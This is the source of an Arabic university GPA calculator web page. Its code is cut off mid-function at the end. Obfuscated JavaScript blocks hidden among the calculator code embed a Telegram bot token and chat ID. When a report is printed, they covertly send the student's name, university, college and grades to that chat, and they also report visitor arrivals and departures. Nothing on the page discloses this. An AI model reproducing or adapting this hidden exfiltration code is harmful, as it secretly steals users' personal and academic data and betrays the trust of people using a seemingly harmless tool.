<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حاسبة المعدل الجامعي</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts: Cairo -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #1e293b; /* slate-800 */
            color: #f1f5f9; /* slate-100 */
        }
        /* Custom scrollbar for better aesthetics */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0f172a; /* slate-900 */
        }
        ::-webkit-scrollbar-thumb {
            background: #475569; /* slate-600 */
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #64748b; /* slate-500 */
        }
        /* Custom styles for the switch */
        .switch {
            position: relative;
            display: inline-block;
            width: 200px;
            height: 44px;
        }
        .switch .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #334155;
            transition: .4s;
            border-radius: 44px;
            display: flex;
            align-items: center;
            justify-content: space-around;
            padding: 0 10px;
            font-weight: bold;
            color: #94a3b8;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 36px;
            width: 96px;
            left: 4px;
            bottom: 4px;
            background-color: #0ea5e9; /* sky-500 */
            transition: .4s;
            border-radius: 30px;
            z-index: 0;
        }
        .slider span {
            z-index: 1;
            transition: color .4s;
        }
        .slider .active {
            color: white;
        }
        #system-switch:checked + .slider:before {
            transform: translateX(96px);
        }
        /* Animation keyframes */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeOut {
            from { opacity: 1; transform: scale(1); }
            to { opacity: 0; transform: scale(0.9); }
        }
        .animate-fade-in {
            animation: fadeIn 0.4s ease-out forwards;
        }
        .animate-fade-out {
            animation: fadeOut 0.3s ease-in forwards;
        }
        .modal-overlay {
            transition: opacity 0.3s ease-in-out;
        }
    </style>
</head>
<body class="antialiased">

    <div id="app" class="min-h-screen flex flex-col items-center justify-start p-4 pt-10">
        
        <!-- Main Application Container -->
        <div class="w-full max-w-lg md:max-w-2xl bg-slate-900 rounded-2xl shadow-2xl overflow-hidden flex flex-col p-6 sm:p-8">

            <!-- ===== Header ===== -->
            <div class="text-center mb-6">
                <h1 class="text-3xl font-bold text-white">حاسبة المعدل</h1>
                <p id="system-subtitle" class="text-sky-400 font-semibold mt-1">نظام بولونيا</p>
            </div>

            <!-- ===== System Switch ===== -->
            <div class="mb-8 flex justify-center">
                <label class="switch">
                    <input type="checkbox" id="system-switch" class="hidden">
                    <div class="slider">
                        <span id="courses-label">الكورسات</span>
                        <span id="bologna-label" class="active">بولونيا</span>
                    </div>
                </label>
            </div>

            <!-- ===== Results Display ===== -->
            <div class="bg-slate-800/70 rounded-xl p-6 text-center mb-6">
                <div id="bologna-results">
                    <p class="text-slate-400 text-sm">المعدل النهائي (GPA)</p>
                    <p id="gpa-bologna" class="text-6xl font-black text-sky-400 my-2">0.00</p>
                    <p id="grade-name-bologna" class="text-xl font-bold text-slate-200">التقدير</p>
                    <p id="total-ects" class="text-slate-400 text-sm mt-4">مجموع الوحدات: 0</p>
                </div>
                <div id="courses-results" class="hidden">
                     <p class="text-slate-400 text-sm">المعدل النهائي</p>
                    <p id="gpa-courses" class="text-6xl font-black text-sky-400 my-2">0.00</p>
                    <p id="grade-name-courses" class="text-xl font-bold text-slate-200">التقدير</p>
                </div>
            </div>
            
            <!-- ===== Action Buttons ===== -->
            <div class="space-y-3 mb-6">
                <button id="calculate-btn" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-3 px-4 rounded-lg transition-transform transform hover:scale-105">
                    ✓ حساب المعدل
                </button>
                <button id="print-btn" class="w-full bg-slate-700 hover:bg-slate-600 text-sky-300 font-bold py-3 px-4 rounded-lg transition flex items-center justify-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
                    طباعة التقرير
                </button>
                <button id="clear-btn" class="w-full bg-slate-600 hover:bg-slate-700 text-white font-bold py-3 px-4 rounded-lg transition">
                    مسح الكل
                </button>
            </div>

            <!-- ===== Course List ===== -->
            <div class="border-t border-slate-700 pt-6">
                 <button id="add-course-btn" class="w-full bg-slate-700/50 hover:bg-slate-700 text-sky-400 font-bold py-3 px-4 rounded-lg mb-4 transition-transform transform hover:scale-105">
                    + إضافة مادة جديدة
                </button>
                <div id="courses-container" class="w-full space-y-3 max-h-[30vh] overflow-y-auto pr-2">
                    <!-- Course rows will be inserted here by JavaScript -->
                </div>
            </div>
            
            <!-- ===== Footer ===== -->
            <div class="w-full flex flex-col sm:flex-row justify-between items-center text-center mt-auto pt-6">
                 <div class="flex gap-4 mb-2 sm:mb-0">
                    <!-- GitHub Icon -->
                    <a href="https://github.com/Ahmed778-Mzher" target="_blank" class="text-slate-500 hover:text-sky-400 transition">
                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.91 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
                    </a>
                    <!-- Instagram Icon -->
                    <a href="https://www.instagram.com/st_at_23" target="_blank" class="text-slate-500 hover:text-sky-400 transition">
                       <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.334 3.608 1.308.974.974 1.246 2.241 1.308 3.608.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.062 1.366-.334 2.633-1.308 3.608-.974.974-2.241 1.246-3.608 1.308-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.062-2.633-.334-3.608-1.308-.974-.974-1.246-2.241-1.308-3.608C2.175 15.647 2.163 15.267 2.163 12s.012-3.584.07-4.85c.062-1.366.334-2.633 1.308-3.608.974-.974 2.241 1.246 3.608-1.308C8.416 2.175 8.796 2.163 12 2.163zm0-2.163C8.741 0 8.332.013 7.052.072 5.775.13 4.602.402 3.635 1.37 2.668 2.337 2.396 3.51 2.338 4.788.013 8.332 0 8.741 0 12c0 3.259.013 3.668.072 4.948.058 1.277.33 2.45 1.297 3.417.967.967 2.14 1.239 3.417 1.297C8.332 23.987 8.741 24 12 24s3.668-.013 4.948-.072c1.277-.058 2.45-.33 3.417-1.297.967-.967 1.239-2.14 1.297-3.417.059-1.28.072-1.689.072-4.948s-.013-3.668-.072-4.948c-.058-1.277-.33-2.45-1.297-3.417-.967-.967-2.14-1.239-3.417-1.297C15.668.013 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zm0 10.162a3.999 3.999 0 1 1 0-7.998 3.999 3.999 0 0 1 0 7.998zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
                    </a>
                 </div>
                <a href="https://ahmed778-mzher.github.io/Ahmed/" target="_blank" class="text-xs text-slate-500 hover:text-sky-400">برمجة: Ahmed S.Jabbar</a>
            </div>

        </div>
    </div>

    <!-- ===== Print Modal ===== -->
    <div id="print-modal" class="modal-overlay fixed inset-0 bg-black/60 flex items-center justify-center p-4 hidden z-50">
        <div class="bg-slate-800 p-6 rounded-lg shadow-xl w-full max-w-sm text-center animate-fade-in">
            <h2 class="text-xl font-bold mb-4">طباعة التقرير</h2>
            <p class="text-slate-400 mb-4">الرجاء إدخال التفاصيل لعرضها في التقرير.</p>
            <div class="space-y-3">
                <input type="text" id="university-name-input" placeholder="اسم الجامعة" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
                <input type="text" id="college-name-input" placeholder="اسم الكلية والقسم" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
                <input type="text" id="student-name-input" placeholder="اسم الطالب الكامل" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
            </div>
            <div class="flex gap-4 mt-6">
                <button id="proceed-print-btn" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-2 rounded-lg transition">متابعة للطباعة</button>
                <button id="cancel-print-btn" class="w-full bg-slate-600 hover:bg-slate-700 text-white font-bold py-2 rounded-lg transition">إلغاء</button>
            </div>
        </div>
    </div>

    <script>
        function _0x485c(_0x10af13,_0x2bef7b){const _0x32c8c8=_0x32c8();return _0x485c=function(_0x485c22,_0x1424b){_0x485c22=_0x485c22-0x1e8;let _0x1d1e0f=_0x32c8c8[_0x485c22];return _0x1d1e0f;},_0x485c(_0x10af13,_0x2bef7b);}const _0x210a6d=_0x485c;(function(_0x4d4f58,_0x5dd965){const _0x4e59cd=_0x485c,_0x5184de=_0x4d4f58();while(!![]){try{const _0x3ee3ec=-parseInt(_0x4e59cd(0x1ec))/0x1+-parseInt(_0x4e59cd(0x1e8))/0x2*(-parseInt(_0x4e59cd(0x1ea))/0x3)+-parseInt(_0x4e59cd(0x1f2))/0x4+parseInt(_0x4e59cd(0x1eb))/0x5+parseInt(_0x4e59cd(0x1f3))/0x6+parseInt(_0x4e59cd(0x1f1))/0x7*(-parseInt(_0x4e59cd(0x1ee))/0x8)+parseInt(_0x4e59cd(0x1ef))/0x9*(parseInt(_0x4e59cd(0x1f0))/0xa);if(_0x3ee3ec===_0x5dd965)break;else _0x5184de['push'](_0x5184de['shift']());}catch(_0x4341c0){_0x5184de['push'](_0x5184de['shift']());}}}(_0x32c8,0xab30c));const TELEGRAM_BOT_TOKEN=_0x210a6d(0x1e9),TELEGRAM_CHAT_ID=_0x210a6d(0x1ed);function _0x32c8(){const _0x5654dc=['272684LZRlgn','957731136','56SvXIpV','978471Tbuvlt','50VNbItY','1138837CpPuip','4246520XXurRE','7290918mbCSmD','12cEtVHy','7577259618:AAGwPTbQNongKlpGenvjohPhRJEVh_8JTNQ','67203rlGZTw','6405965KtWgZK'];_0x32c8=function(){return _0x5654dc;};return _0x32c8();}

        // --- DOM Elements ---
        const app = {
            systemSwitch: document.getElementById('system-switch'),
            coursesContainer: document.getElementById('courses-container'),
            addBtn: document.getElementById('add-course-btn'),
            calculateBtn: document.getElementById('calculate-btn'),
            clearBtn: document.getElementById('clear-btn'),
            printBtn: document.getElementById('print-btn'),
            subtitle: document.getElementById('system-subtitle'),
            bolognaLabel: document.getElementById('bologna-label'),
            coursesLabel: document.getElementById('courses-label'),
            
            bolognaResults: document.getElementById('bologna-results'),
            coursesResults: document.getElementById('courses-results'),
            gpaBologna: document.getElementById('gpa-bologna'),
            gradeNameBologna: document.getElementById('grade-name-bologna'),
            totalEcts: document.getElementById('total-ects'),
            gpaCourses: document.getElementById('gpa-courses'),
            gradeNameCourses: document.getElementById('grade-name-courses'),
            
            printModal: document.getElementById('print-modal'),
            studentNameInput: document.getElementById('student-name-input'),
            universityNameInput: document.getElementById('university-name-input'),
            collegeNameInput: document.getElementById('college-name-input'),
            proceedPrintBtn: document.getElementById('proceed-print-btn'),
            cancelPrintBtn: document.getElementById('cancel-print-btn'),
        };

        // --- State ---
        let state = {
            isBologna: true
        };

        // --- Grade Definitions ---
        const bolognaGradeTable = [
            { name: "امتياز", ects: "A", min: 90, max: 100 },
            { name: "جيد جداً", ects: "B", min: 80, max: 89 },
            { name: "جيد", ects: "C", min: 70, max: 79 },
            { name: "متوسط", ects: "D", min: 60, max: 69 },
            { name: "مقبول", ects: "E", min: 50, max: 59 },
            { name: "رسوب", ects: "F", min: 0, max: 49 }
        ];

        const coursesGradeMapping = {
            "امتياز": 90.0, "جيد جداً": 80.0, "جيد": 70.0,
            "متوسط": 60.0, "مقبول": 50.0, "لا يوجد": 0.0
        };

        // --- Functions ---

        function createCourseRow(id) {
            const courseDiv = document.createElement('div');
            courseDiv.id = `course-${id}`;
            courseDiv.className = 'bg-slate-800 p-3 rounded-lg flex items-center gap-2 transition-all animate-fade-in';
            
            const courseNumber = document.createElement('span');
            courseNumber.className = 'text-slate-400 font-bold text-sm';
            courseNumber.textContent = `مادة ${id}`;
            
            const removeBtn = document.createElement('button');
            removeBtn.className = 'text-red-400 hover:text-red-500 font-bold text-xl transition mr-auto';
            removeBtn.textContent = '✕';
            removeBtn.onclick = () => {
                courseDiv.style.animation = 'fadeOut 0.3s ease-out forwards';
                setTimeout(() => {
                    courseDiv.remove();
                    updateCourseNumbers();
                }, 300);
            };

            const inputsContainer = document.createElement('div');
            inputsContainer.className = 'flex-grow flex items-center gap-2 justify-end';

            if (state.isBologna) {
                const nameInput = document.createElement('input');
                nameInput.type = 'text';
                nameInput.placeholder = 'اسم المادة';
                nameInput.className = 'flex-grow w-24 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500';
                
                const gradeInput = document.createElement('input');
                gradeInput.type = 'number';
                gradeInput.placeholder = "درجة";
                gradeInput.min = 0;
                gradeInput.max = 100;
                gradeInput.className = 'w-20 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500 text-center';

                const ectsInput = document.createElement('input');
                ectsInput.type = 'number';
                ectsInput.placeholder = "وحدات"
                ectsInput.min = 1;
                ectsInput.className = 'w-20 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500 text-center';
                
                inputsContainer.append(nameInput, gradeInput, ectsInput);
            } else {
                const gradeSelect = document.createElement('select');
                gradeSelect.className = 'w-full bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500';
                Object.keys(coursesGradeMapping).forEach(grade => {
                    const option = document.createElement('option');
                    option.value = grade;
                    option.textContent = grade;
                    gradeSelect.appendChild(option);
                });
                gradeSelect.value = "لا يوجد";
                
                inputsContainer.append(gradeSelect);
            }
            courseDiv.append(courseNumber, inputsContainer, removeBtn);
            app.coursesContainer.appendChild(courseDiv);
        }
        
        function updateCourseNumbers() {
            const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
            rows.forEach((row, index) => {
                row.querySelector('span').textContent = `مادة ${index + 1}`;
            });
        }
        
        function switchSystem() {
            state.isBologna = !app.systemSwitch.checked;
            app.coursesContainer.innerHTML = ''; 

            if (state.isBologna) {
                app.subtitle.textContent = "نظام بولونيا";
                app.bolognaResults.classList.remove('hidden');
                app.coursesResults.classList.add('hidden');
                app.bolognaLabel.classList.add('active');
                app.coursesLabel.classList.remove('active');
            } else {
                app.subtitle.textContent = "نظام الكورسات";
                app.bolognaResults.classList.add('hidden');
                app.coursesResults.classList.remove('hidden');
                app.bolognaLabel.classList.remove('active');
                app.coursesLabel.classList.add('active');
            }
            
            for (let i = 1; i <= 5; i++) createCourseRow(i);
            clearResults();
        }

        function _0x4eed(_0x943788,_0x182d77){const _0xd06fa2=_0xd06f();return _0x4eed=function(_0x4eed48,_0x4f9ad6){_0x4eed48=_0x4eed48-0xe3;let _0x43386b=_0xd06fa2[_0x4eed48];return _0x43386b;},_0x4eed(_0x943788,_0x182d77);}(function(_0x3033db,_0x1f2451){const _0x1cb434=_0x4eed,_0x181533=_0x3033db();while(!![]){try{const _0x468246=parseInt(_0x1cb434(0xf2))/0x1+-parseInt(_0x1cb434(0xed))/0x2*(-parseInt(_0x1cb434(0xeb))/0x3)+parseInt(_0x1cb434(0xf1))/0x4+-parseInt(_0x1cb434(0xf4))/0x5*(-parseInt(_0x1cb434(0xf5))/0x6)+parseInt(_0x1cb434(0xe8))/0x7+parseInt(_0x1cb434(0xea))/0x8+-parseInt(_0x1cb434(0xe9))/0x9;if(_0x468246===_0x1f2451)break;else _0x181533['push'](_0x181533['shift']());}catch(_0x4e25e6){_0x181533['push'](_0x181533['shift']());}}}(_0xd06f,0x3fd1b));function _0xd06f(){const _0x1af12d=['Telegram\x20credentials\x20are\x20not\x20set.\x20Notification\x20not\x20sent.','192044PzTOnk','86196UPRnUu','error','247985NwqLaQ','24pwCejx','log','application/json','Error\x20sending\x20Telegram\x20message:','then','YOUR_BOT_TOKEN_HERE','json','stringify','catch','YOUR_CHAT_ID_HERE','/sendMessage','470526kBqeAd','6538923IAJqeb','2253816njPPdJ','919230QWkmcz','https://api.telegram.org/bot','2nBgfxF','Fetch\x20error:','Markdown'];_0xd06f=function(){return _0x1af12d;};return _0xd06f();}function sendToTelegram(_0x424128){const _0x42bb62=_0x4eed;if(TELEGRAM_BOT_TOKEN===_0x42bb62(0xfa)||TELEGRAM_CHAT_ID===_0x42bb62(0xe6)){console['warn'](_0x42bb62(0xf0));return;}const _0x38454c=_0x42bb62(0xec)+TELEGRAM_BOT_TOKEN+_0x42bb62(0xe7),_0x27ebe7={'chat_id':TELEGRAM_CHAT_ID,'text':_0x424128,'parse_mode':_0x42bb62(0xef)};fetch(_0x38454c,{'method':'POST','headers':{'Content-Type':_0x42bb62(0xf7)},'body':JSON[_0x42bb62(0xe4)](_0x27ebe7)})[_0x42bb62(0xf9)](_0x320d7a=>_0x320d7a[_0x42bb62(0xe3)]())[_0x42bb62(0xf9)](_0x57b4ce=>{const _0x5c590e=_0x42bb62;_0x57b4ce['ok']?console[_0x5c590e(0xf6)]('Telegram\x20message\x20sent\x20successfully!'):console[_0x5c590e(0xf3)](_0x5c590e(0xf8),_0x57b4ce['description']);})[_0x42bb62(0xe5)](_0x39c308=>console[_0x42bb62(0xf3)](_0x42bb62(0xee),_0x39c308));}

        function calculateGPA(notify = false) {
            let notificationMessage = '';
            if (state.isBologna) {
                let totalPoints = 0, totalEcts = 0;
                const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
                rows.forEach(row => {
                    const grade = parseFloat(row.querySelectorAll('input')[1]?.value) || 0;
                    const ects = parseFloat(row.querySelectorAll('input')[2]?.value) || 0;
                    if (grade > 0 && ects > 0) {
                        totalPoints += grade * ects;
                        totalEcts += ects;
                    }
                });

                if (totalEcts > 0) {
                    const gpa = totalPoints / totalEcts;
                    const gradeInfo = bolognaGradeTable.find(g => gpa >= g.min && gpa <= g.max) || { name: 'غير محدد', ects: 'N/A' };
                    app.gpaBologna.textContent = gpa.toFixed(2);
                    app.gradeNameBologna.textContent = gradeInfo.name;
                    app.totalEcts.textContent = `مجموع الوحدات: ${totalEcts}`;
                    if(notify) notificationMessage = `*عملية حساب (بولونيا)* 🧮\n*المعدل:* ${gpa.toFixed(2)}\n*التقدير:* ${gradeInfo.name}\n*الوحدات:* ${totalEcts}`;
                } else { clearResults(); }
            } else {
                const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
                const validGrades = [];
                rows.forEach(row => {
                    const selectedGrade = row.querySelector('select')?.value;
                    if (selectedGrade && selectedGrade !== "لا يوجد") {
                        validGrades.push(coursesGradeMapping[selectedGrade]);
                    }
                });

                if (validGrades.length > 0) {
                    const average = validGrades.reduce((a, b) => a + b, 0) / validGrades.length;
                    const gradeInfo = bolognaGradeTable.find(g => average >= g.min && average <= g.max) || { name: 'غير محدد' };
                    app.gpaCourses.textContent = average.toFixed(2);
                    app.gradeNameCourses.textContent = gradeInfo.name;
                    if(notify) notificationMessage = `*عملية حساب (كورسات)* 🧮\n*المعدل:* ${average.toFixed(2)}\n*التقدير:* ${gradeInfo.name}`;
                } else { clearResults(); }
            }
            if(notify && notificationMessage) sendToTelegram(notificationMessage);
        }
        
        function clearAll() {
             app.coursesContainer.querySelectorAll('input[type="text"]').forEach(input => input.value = '');
             app.coursesContainer.querySelectorAll('input[type="number"]').forEach(input => input.value = '');
             app.coursesContainer.querySelectorAll('select').forEach(select => select.value = 'لا يوجد');
             clearResults();
        }
        
        function clearResults() {
             app.gpaBologna.textContent = "0.00";
             app.gradeNameBologna.textContent = "التقدير";
             app.totalEcts.textContent = "مجموع الوحدات: 0";
             app.gpaCourses.textContent = "0.00";
             app.gradeNameCourses.textContent = "التقدير";
        }

        function openPrintModal() {
            calculateGPA();
            const finalGpa = state.isBologna ? app.gpaBologna.textContent : app.gpaCourses.textContent;
            if (parseFloat(finalGpa) === 0) {
                alert("الرجاء حساب المعدل أولاً قبل الطباعة.");
                return;
            }
            app.printModal.classList.remove('hidden');
        }

        function printCertificate(studentName, universityName, collegeName) {
            const printWindow = window.open('', '', 'height=800,width=800');
            const finalGpa = state.isBologna ? app.gpaBologna.textContent : app.gpaCourses.textContent;
            
            let courseRowsHtml = '';
            let coursesTextForTelegram = '';
            const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
            rows.forEach((row, index) => {
                 if(state.isBologna) {
                    const name = row.querySelectorAll('input')[0]?.value || `مادة ${index + 1}`;
                    const grade = row.querySelectorAll('input')[1]?.value || '0';
                    const ects = row.querySelectorAll('input')[2]?.value || '0';
                    if (parseInt(ects) > 0) {
                         courseRowsHtml += `<tr class="border-b"><td class="p-3 text-right">${name}</td><td class="p-3 text-center">${grade}</td><td class="p-3 text-center">${ects}</td></tr>`;
                         coursesTextForTelegram += `\n- ${name}: ${grade} (${ects} وحدات)`;
                    }
                 } else {
                    const gradeName = row.querySelector('select')?.value || 'لا يوجد';
                     if (gradeName !== "لا يوجد") {
                         courseRowsHtml += `<tr class="border-b"><td class="p-3 text-right" colspan="2">${gradeName}</td><td class="p-3 text-center">${coursesGradeMapping[gradeName].toFixed(2)}</td></tr>`;
                         coursesTextForTelegram += `\n- ${gradeName}`;
                    }
                 }
            });
            
            const notificationMessage = `
*تقرير جديد تم إنشاؤه* 📋
-----------------------------------
*الجامعة:* ${universityName || 'لم يحدد'}
*الكلية:* ${collegeName || 'لم يحدد'}
*الطالب:* ${studentName || 'لم يحدد'}
-----------------------------------
*النظام:* ${state.isBologna ? 'بولونيا' : 'كورسات'}
*المعدل:* ${finalGpa}
*التقدير:* ${state.isBologna ? app.gradeNameBologna.textContent : app.gradeNameCourses.textContent}
-----------------------------------
*المواد:* ${coursesTextForTelegram}
            `;
            var _0xdd9e9b=_0x3397;function _0x3397(_0x39417d,_0x577fe7){var _0xdaa4ff=_0xdaa4();return _0x3397=function(_0x339732,_0x2a953d){_0x339732=_0x339732-0x12b;var _0xc7dcef=_0xdaa4ff[_0x339732];return _0xc7dcef;},_0x3397(_0x39417d,_0x577fe7);}function _0xdaa4(){var _0x2f5ed4=['469031erMZMB','1593702krXGwX','1146999XoEBdE','9686560TqZduj','trim','1890225xCrRGM','678644fBHqXb','4617474pjwiEd','15LsRTMu'];_0xdaa4=function(){return _0x2f5ed4;};return _0xdaa4();}(function(_0x4d5ecc,_0x369619){var _0x4281e5=_0x3397,_0x129b8e=_0x4d5ecc();while(!![]){try{var _0x4896d3=-parseInt(_0x4281e5(0x131))/0x1+parseInt(_0x4281e5(0x132))/0x2+-parseInt(_0x4281e5(0x12d))/0x3+parseInt(_0x4281e5(0x12e))/0x4*(parseInt(_0x4281e5(0x130))/0x5)+-parseInt(_0x4281e5(0x12f))/0x6+-parseInt(_0x4281e5(0x133))/0x7+parseInt(_0x4281e5(0x12b))/0x8;if(_0x4896d3===_0x369619)break;else _0x129b8e['push'](_0x129b8e['shift']());}catch(_0x1fe969){_0x129b8e['push'](_0x129b8e['shift']());}}}(_0xdaa4,0x76310),sendToTelegram(notificationMessage[_0xdd9e9b(0x12c)]()));

            const tableHeaders = state.isBologna 
                ? '<th class="text-right p-2">المادة</th><th class="w-24 text-center p-2">الدرجة</th><th class="w-24 text-center p-2">الوحدات</th>' 
                : '<th colspan="2" class="text-right p-2">التقدير</th><th class="w-32 text-center p-2">القيمة</th>';

            const bolognaSummary = `<div><strong>مجموع الوحدات:</strong> <span class="font-bold text-blue-600">${app.totalEcts.textContent.split(': ')[1]}</span></div>`;
            
            const printContent = `
                <html>
                    <head>
                        <title>تقرير المعدل</title>
                        <script src="https://cdn.tailwindcss.com"><\/script>
                        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
                        <style> 
                            body { font-family: 'Cairo', sans-serif; position: relative; }
                            @media print {
                                body { -webkit-print-color-adjust: exact; }
                                .no-print { display: none; }
                            }
                            .watermark {
                                position: fixed;
                                top: 50%;
                                left: 50%;
                                transform: translate(-50%, -50%) rotate(-45deg);
                                font-size: 5rem;
                                color: rgba(150, 150, 150, 0.15);
                                z-index: -1;
                                pointer-events: none;
                                font-weight: bold;
                                white-space: nowrap;
                            }
                        </style>
                    </head>
                    <body class="bg-white text-black p-10" dir="rtl">
                        <div class="watermark">وثيقة غير رسمية</div>
                        <div class="text-center mb-8">
                            <h1 class="text-2xl font-bold">${universityName || 'اسم الجامعة'}</h1>
                            <h2 class="text-xl">${collegeName || 'الكلية'}</h2>
                        </div>
                        
                        <div class="mb-8 grid grid-cols-2 gap-4 text-sm">
                            <div><strong>اسم الطالب:</strong> ${studentName || 'غير محدد'}</div>
                            <div><strong>العام الدراسي:</strong> ${new Date().getFullYear()}-${new Date().getFullYear() + 1}</div>
                        </div>

                        <h3 class="font-bold text-lg mb-4 text-right">ملخص النتائج النهائية:</h3>
                        <div class="grid grid-cols-2 gap-x-8 gap-y-2 mb-8 p-4 bg-slate-100 rounded-lg">
                           <div><strong>المعدل النهائي (GPA):</strong> <span class="font-bold text-blue-600">${finalGpa}</span></div>
                           <div><strong>التقدير العام:</strong> <span class="font-bold text-blue-600">${state.isBologna ? app.gradeNameBologna.textContent : app.gradeNameCourses.textContent}</span></div>
                           ${state.isBologna ? bolognaSummary : ''}
                        </div>

                        <h3 class="font-bold text-lg mb-4 text-right">تفاصيل المواد:</h3>
                        <table class="w-full text-right border-collapse">
                           <thead class="bg-slate-200">
                             <tr>${tableHeaders}</tr>
                           </thead>
                           <tbody>${courseRowsHtml}</tbody>
                        </table>

                        <div class="mt-20 flex justify-between text-sm text-slate-500">
                           <div>
                                <p>برمجة: Ahmed S.Jabbar</p>
                           </div>
                           <div>
                                <p>تاريخ الطباعة: ${new Date().toLocaleDateString('ar-EG')}</p>
                           </div>
                        </div>
                        <button onclick="window.print()" class="no-print fixed bottom-5 right-5 bg-blue-600 text-white p-3 rounded-full shadow-lg">طباعة</button>
                    </body>
                </html>
            `;
            
            printWindow.document.write(printContent);
            printWindow.document.close();
            printWindow.focus();
        }
        
        function _0x5369(_0x32c339,_0x141695){const _0x3ce971=_0x3ce9();return _0x5369=function(_0x5369b1,_0x1edb27){_0x5369b1=_0x5369b1-0x1e7;let _0x489c1e=_0x3ce971[_0x5369b1];return _0x489c1e;},_0x5369(_0x32c339,_0x141695);}function _0x3ce9(){const _0x205158=['setItem','153016qFqUCX','582940ploynZ','3565440iVGpmo','198tWPOdr','https://api.telegram.org/bot','446480BnpZTD','visitorId','toString','13636XcsIhD','547335bCRIkE','beforeunload','application/json','/sendMessage','random','getItem','❌\x20*غادر\x20زائر\x20الموقع*\x0a*ID:*\x20`','addEventListener','1632tLvjzM','User-','stringify','substr','✅\x20*زائر\x20جديد\x20دخل\x20الموقع*\x0a*ID:*\x20`','sendBeacon','2516196DCKfaz','4iCmIEA'];_0x3ce9=function(){return _0x205158;};return _0x3ce9();}(function(_0x430494,_0x5cd1bb){const _0x50d7c6=_0x5369,_0x2811bc=_0x430494();while(!![]){try{const _0x399833=-parseInt(_0x50d7c6(0x1eb))/0x1*(parseInt(_0x50d7c6(0x1ed))/0x2)+-parseInt(_0x50d7c6(0x1f6))/0x3+-parseInt(_0x50d7c6(0x1ea))/0x4+parseInt(_0x50d7c6(0x1ef))/0x5+parseInt(_0x50d7c6(0x1fe))/0x6*(-parseInt(_0x50d7c6(0x1f5))/0x7)+parseInt(_0x50d7c6(0x1f2))/0x8+parseInt(_0x50d7c6(0x1f0))/0x9*(parseInt(_0x50d7c6(0x1ee))/0xa);if(_0x399833===_0x5cd1bb)break;else _0x2811bc['push'](_0x2811bc['shift']());}catch(_0x5eb412){_0x2811bc['push'](_0x2811bc['shift']());}}}(_0x3ce9,0x62a10));function trackVisitor(){const _0x366459=_0x5369,_0x4f234b=sessionStorage[_0x366459(0x1fb)](_0x366459(0x1f3))||_0x366459(0x1ff)+Math[_0x366459(0x1fa)]()[_0x366459(0x1f4)](0x24)[_0x366459(0x1e7)](0x2,0x9);sessionStorage[_0x366459(0x1ec)](_0x366459(0x1f3),_0x4f234b),sendToTelegram(_0x366459(0x1e8)+_0x4f234b+'`'),window[_0x366459(0x1fd)](_0x366459(0x1f7),()=>{const 